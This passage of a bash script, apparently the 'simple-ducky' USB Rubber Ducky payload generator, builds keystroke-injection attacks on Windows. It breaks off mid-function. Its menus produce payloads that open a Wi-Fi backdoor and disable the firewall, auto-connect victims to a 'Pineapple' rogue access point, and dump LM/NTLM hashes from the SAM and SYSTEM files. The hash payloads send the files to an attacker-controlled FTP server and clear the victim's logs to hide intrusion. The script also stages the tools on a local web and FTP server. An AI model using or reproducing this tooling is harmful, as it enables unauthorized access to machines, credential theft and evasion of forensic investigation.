	read -p "What would you like the SSID to be? " attackerssid
	echo ""
	read -p "What would you like the AP's key to be? " attackerkey
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard languagee\e[0m"
	echo ""
	sed "/STRING/s/attackerssid/$attackerssid/g" /usr/share/ducky/encoder/payloads/wifibackdoorWIN8uac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerkey/$attackerkey/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 	
	clear
	nautilus /usr/share/ducky/encoder/ &
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# WiFi Backdoor w/o UAC (Win 8)
#################################################################################
f_wifibackdoorWIN8nouac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload opens an Administrative cmd.exe session, then creates a wireless access point and disables the firewall"
	echo -e "\e[1;31mTarget:\e[0m Windows 8 w/o UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m Darren Kitchen"
	echo ""
	echo ""
	echo -e ""
	read -p "What would you like the SSID to be? " attackerssid
	echo ""
	read -p "What would you like the AP's key to be? " attackerkey
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard languagee\e[0m"
	echo ""
	sed "/STRING/s/attackerssid/$attackerssid/g" /usr/share/ducky/encoder/payloads/wifibackdoorWIN8nouac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerkey/$attackerkey/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 	
	clear
	nautilus /usr/share/ducky/encoder/ &
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# WiFi Autoconnect w/UAC (Designed for the WiFi Pineapple | Win Vista/7)
#################################################################################
f_wifiautoconnectVIS7uac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m Downloads an xml file from pastebin (using Mubix’ powershell code) and the adds it to the wireless profiles using netsh."
	echo -e "\e[1;31mNote:\e[0m The autoconnect acess point will be set to - Pineapple"
	echo -e "\e[1;31mOptions:\e[0m You might want to change the name of the access point, but you’ll need to upload your own xml. Just modify the 'wifi_autoconnect.con' file in the /usr/share/ducky/encoder/payloads/ directory"
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 w/UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m Xcellerator"
	echo -e ""
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	echo
	clear
	cp /usr/share/ducky/encoder/payloads/wifiautoconnectVIS7uac.conf /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 	
	clear
	nautilus /usr/share/ducky/encoder/ &
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# WiFi Autoconnect w/o UAC (Designed for the WiFi Pineapple | Win Vista/7)
#################################################################################
f_wifiautoconnectVIS7nouac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m Downloads an xml file from pastebin (using Mubix’ powershell code) and the adds it to the wireless profiles using netsh."
	echo -e "\e[1;31mNote:\e[0m The autoconnect acess point will be set to - Pineapple"
	echo -e "\e[1;31mOptions:\e[0m You might want to change the name of the access point, but you’ll need to upload your own xml. Just modify the 'wifi_autoconnect.con' file in the /usr/share/ducky/encoder/payloads/ directory"
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 w/o UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m Xcellerator"
	echo -e ""
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	echo
	clear
	cp /usr/share/ducky/encoder/payloads/wifiautoconnectVIS7nouac.conf /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 	
	clear
	nautilus /usr/share/ducky/encoder/ &
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# WiFi Autoconnect w/UAC (Designed for the WiFi Pineapple | Win 8)
#################################################################################
f_wifiautoconnectWIN8uac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m Downloads an xml file from pastebin (using Mubix’ powershell code) and the adds it to the wireless profiles using netsh."
	echo -e "\e[1;31mNote:\e[0m The autoconnect acess point will be set to - Pineapple"
	echo -e "\e[1;31mOptions:\e[0m You might want to change the name of the access point, but you’ll need to upload your own xml. Just modify the 'wifi_autoconnect.con' file in the /usr/share/ducky/encoder/payloads/ directory"
	echo -e "\e[1;31mTarget:\e[0m Windows 8 w/UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m Xcellerator"
	echo -e ""
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	echo
	clear
	cp /usr/share/ducky/encoder/payloads/wifiautoconnectWIN8uac.conf /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 	
	clear
	nautilus /usr/share/ducky/encoder/ &
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# WiFi Autoconnect w/o UAC (Designed for the WiFi Pineapple | Win 8)
#################################################################################
f_wifiautoconnectWIN8nouac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m Downloads an xml file from pastebin (using Mubix’ powershell code) and the adds it to the wireless profiles using netsh."
	echo -e "\e[1;31mNote:\e[0m The autoconnect acess point will be set to - Pineapple"
	echo -e "\e[1;31mOptions:\e[0m You might want to change the name of the access point, but you’ll need to upload your own xml. Just modify the 'wifi_autoconnect.con' file in the /usr/share/ducky/encoder/payloads/ directory"
	echo -e "\e[1;31mTarget:\e[0m Windows 8 w/o UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m Xcellerator"
	echo -e ""
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	echo
	clear
	cp /usr/share/ducky/encoder/payloads/wifiautoconnectWIN8nouac.conf /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 	
	clear
	nautilus /usr/share/ducky/encoder/ &
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
#################################################################################
#
# Password Attacks
#
#################################################################################
#################################################################################

#################################################################################
# LM/NTLM Hash Dump From Live System w/UAC (Win Vista/7/Server 2008)
#################################################################################
f_livehashVIS7uac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload uses VSSOwn.vbs (slightly modified) along with Pure-FTPD and 7zip to extract the SAM & SYSTEM file from the victims machine. This payload also clears all the logs from the machine, erasing any history of you being there."
	echo -e "\e[1;31mVSSOwn.vbs link:\e[0m http://ptscripts.googlecode.com/svn/trunk/windows/vssown.vbs"
	echo -e "\e[1;31m7zip Command Line link:\e[0m http://downloads.sourceforge.net/sevenzip/7za920.zip"
	echo -e "\e[1;31mNote 1:\e[0m I will place 7zip, vssown.vbs, logs.bat in the /var/www/ directory for you. The links above are just for reference."
	echo -e "\e[1;31mNote 2:\e[0m You might get an error stating that ntds.dit doesnt exist. This is because it is only located on Windows servers, so don't worry about it."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7/Server 2008 w/UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m skysploit"
	echo ""
	echo ""
	read -p "What is the IP/Domain of your ftp server? " attackerftp
	echo ""
	read -p "What is the username for your ftp server? " attackerusername
	echo ""
	read -p "What is the password for your ftp server? " attackerpassword
	echo ""
	echo ""echo -e "What is the IP/Domain address for your webserver? " 
	read -p "[Example: www.example.com | www.example.com:port | $attackerftp] " webserverip
	echo ""
	read -p "Please set a password to be for your encrypted zip files. " zippassword
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	sed "/STRING/s/attackerftp/$attackerftp/g" /usr/share/ducky/encoder/payloads/livehashVIS7uac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerusername/$attackerusername/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload_del2.txt
	sed "/STRING/s/attackerpassword/$attackerpassword/g" /usr/share/ducky/encoder/payload_del2.txt > /usr/share/ducky/encoder/payload_del3.txt
	sed "/STRING/s/webserverip/$webserverip/g" /usr/share/ducky/encoder/payload_del3.txt > /usr/share/ducky/encoder/payload_del4.txt
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/ducky/encoder/payload_del4.txt > /usr/share/ducky/encoder/payload_del5.txt
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/ducky/encoder/payload_del5.txt > /usr/share/ducky/encoder/payload_del6.txt
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/ducky/encoder/payload_del6.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	rm /usr/share/ducky/encoder/payload_del2.txt
	rm /usr/share/ducky/encoder/payload_del3.txt
	rm /usr/share/ducky/encoder/payload_del4.txt
	rm /usr/share/ducky/encoder/payload_del5.txt
	rm /usr/share/ducky/encoder/payload_del6.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	echo -e "\e[1;34mMoving files over to your web directory and starting your web and ftp servers.\e[0m"
	sleep 4
	clear
	cp /usr/share/ducky/encoder/misc/7za.exe /var/www/7za.exe
	clear
	service apache2 restart
	clear
	service pure-ftpd restart
	clear
	nautilus /usr/share/ducky/encoder/ &
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# LM/NTLM Hash Dump From Live System w/o UAC (Win Vista/7/Server 2008)
#################################################################################
f_livehashVIS7nouac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload uses VSSOwn.vbs (slightly modified) along with Pure-FTPD and 7zip to extract the SAM & SYSTEM file from the victims machine. This payload also clears all the logs from the machine, erasing any history of you being there."
	echo -e "\e[1;31mVSSOwn.vbs link:\e[0m http://ptscripts.googlecode.com/svn/trunk/windows/vssown.vbs"
	echo -e "\e[1;31m7zip Command Line link:\e[0m http://downloads.sourceforge.net/sevenzip/7za920.zip"
	echo -e "\e[1;31mNote 1:\e[0m I will place 7zip, vssown.vbs, logs.bat in the /var/www/ directory for you. The links above are just for reference."
	echo -e "\e[1;31mNote 2:\e[0m You might get an error stating that ntds.dit doesnt exist. This is because it is only located on Windows servers, so don't worry about it."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7/Server 2008 w/o UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m skysploit"
	echo ""
	echo ""
	read -p "What is the IP/Domain of your ftp server? " attackerftp
	echo ""
	read -p "What is the username for your ftp server? " attackerusername
	echo ""
	read -p "What is the password for your ftp server? " attackerpassword
	echo ""
	echo ""echo -e "What is the IP/Domain address for your webserver? " 
	read -p "[Example: www.example.com | www.example.com:port | $attackerftp] " webserverip
	echo ""
	read -p "Please set a password to be for your encrypted zip files. " zippassword
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	sed "/STRING/s/attackerftp/$attackerftp/g" /usr/share/ducky/encoder/payloads/livehashVIS7nouac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerusername/$attackerusername/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload_del2.txt
	sed "/STRING/s/attackerpassword/$attackerpassword/g" /usr/share/ducky/encoder/payload_del2.txt > /usr/share/ducky/encoder/payload_del3.txt
	sed "/STRING/s/webserverip/$webserverip/g" /usr/share/ducky/encoder/payload_del3.txt > /usr/share/ducky/encoder/payload_del4.txt
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/ducky/encoder/payload_del4.txt > /usr/share/ducky/encoder/payload_del5.txt
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/ducky/encoder/payload_del5.txt > /usr/share/ducky/encoder/payload_del6.txt
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/ducky/encoder/payload_del6.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	rm /usr/share/ducky/encoder/payload_del2.txt
	rm /usr/share/ducky/encoder/payload_del3.txt
	rm /usr/share/ducky/encoder/payload_del4.txt
	rm /usr/share/ducky/encoder/payload_del5.txt
	rm /usr/share/ducky/encoder/payload_del6.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	echo -e "\e[1;34mMoving files over to your web directory and starting your web and ftp servers.\e[0m"
	sleep 4
	clear
	cp /usr/share/ducky/encoder/misc/7za.exe /var/www/7za.exe
	clear
	service apache2 restart
	clear
	service pure-ftpd restart
	clear
	nautilus /usr/share/ducky/encoder/ &
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# LM/NTLM Hash Dump From Live System w/UAC (Windows 8)
#################################################################################
f_livehashWIN8uac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload uses VSSOwn.vbs (slightly modified) along with Pure-FTPD and 7zip to extract the SAM & SYSTEM file from the victims machine. This payload also clears all the logs from the machine, erasing any history of you being there."
	echo -e "\e[1;31mVSSOwn.vbs link:\e[0m http://ptscripts.googlecode.com/svn/trunk/windows/vssown.vbs"
	echo -e "\e[1;31m7zip Command Line link:\e[0m http://downloads.sourceforge.net/sevenzip/7za920.zip"
	echo -e "\e[1;31mNote 1:\e[0m I will place 7zip, vssown.vbs, logs.bat in the /var/www/ directory for you. The links above are just for reference."
	echo -e "\e[1;31mNote 2:\e[0m You might get an error stating that ntds.dit doesnt exist. This is because it is only located on Windows servers, so don't worry about it."
	echo -e "\e[1;31mTarget:\e[0m Windows 8 w/UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m skysploit"
	echo ""
	echo ""
	read -p "What is the IP/Domain of your ftp server? " attackerftp
	echo ""
	read -p "What is the username for your ftp server? " attackerusername
	echo ""
	read -p "What is the password for your ftp server? " attackerpassword
	echo ""
	echo ""echo -e "What is the IP/Domain address for your webserver? " 
	read -p "[Example: www.example.com | www.example.com:port | $attackerftp] " webserverip
	echo ""
	read -p "Please set a password to be for your encrypted zip files. " zippassword
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	sed "/STRING/s/attackerftp/$attackerftp/g" /usr/share/ducky/encoder/payloads/livehashWIN8uac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerusername/$attackerusername/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload_del2.txt
	sed "/STRING/s/attackerpassword/$attackerpassword/g" /usr/share/ducky/encoder/payload_del2.txt > /usr/share/ducky/encoder/payload_del3.txt
	sed "/STRING/s/webserverip/$webserverip/g" /usr/share/ducky/encoder/payload_del3.txt > /usr/share/ducky/encoder/payload_del4.txt
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/ducky/encoder/payload_del4.txt > /usr/share/ducky/encoder/payload_del5.txt
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/ducky/encoder/payload_del5.txt > /usr/share/ducky/encoder/payload_del6.txt
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/ducky/encoder/payload_del6.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	rm /usr/share/ducky/encoder/payload_del2.txt
	rm /usr/share/ducky/encoder/payload_del3.txt
	rm /usr/share/ducky/encoder/payload_del4.txt
	rm /usr/share/ducky/encoder/payload_del5.txt
	rm /usr/share/ducky/encoder/payload_del6.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	echo -e "\e[1;34mMoving files over to your web directory and starting your web and ftp servers.\e[0m"
	sleep 4
	clear
	cp /usr/share/ducky/encoder/misc/7za.exe /var/www/7za.exe
	clear
	service apache2 restart
	clear
	service pure-ftpd restart
	clear
	nautilus /usr/share/ducky/encoder/ &
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# LM/NTLM Hash Dump From Live System w/o UAC (Windows 8)
#################################################################################
f_livehashWIN8nouac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload uses VSSOwn.vbs (slightly modified) along with Pure-FTPD and 7zip to extract the SAM & SYSTEM file from the victims machine. This payload also clears all the logs from the machine, erasing any history of you being there."
	echo -e "\e[1;31mVSSOwn.vbs link:\e[0m http://ptscripts.googlecode.com/svn/trunk/windows/vssown.vbs"
	echo -e "\e[1;31m7zip Command Line link:\e[0m http://downloads.sourceforge.net/sevenzip/7za920.zip"
	echo -e "\e[1;31mNote 1:\e[0m I will place 7zip, vssown.vbs, logs.bat in the /var/www/ directory for you. The links above are just for reference."
	echo -e "\e[1;31mNote 2:\e[0m You might get an error stating that ntds.dit doesnt exist. This is because it is only located on Windows servers, so don't worry about it."
	echo -e "\e[1;31mTarget:\e[0m Windows 8 w/o UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m skysploit"
	echo ""
	echo ""
	read -p "What is the IP/Domain of your ftp server? " attackerftp
	echo ""
	read -p "What is the username for your ftp server? " attackerusername
	echo ""
	read -p "What is the password for your ftp server? " attackerpassword
	echo ""
	echo ""echo -e "What is the IP/Domain address for your webserver? " 
	read -p "[Example: www.example.com | www.example.com:port | $attackerftp] " webserverip
	echo ""
	read -p "Please set a password to be for your encrypted zip files. " zippassword
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	sed "/STRING/s/attackerftp/$attackerftp/g" /usr/share/ducky/encoder/payloads/livehashWIN8nouac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerusername/$attackerusername/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload_del2.txt
	sed "/STRING/s/attackerpassword/$attackerpassword/g" /usr/share/ducky/encoder/payload_del2.txt > /usr/share/ducky/encoder/payload_del3.txt
	sed "/STRING/s/webserverip/$webserverip/g" /usr/share/ducky/encoder/payload_del3.txt > /usr/share/ducky/encoder/payload_del4.txt
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/ducky/encoder/payload_del4.txt > /usr/share/ducky/encoder/payload_del5.txt
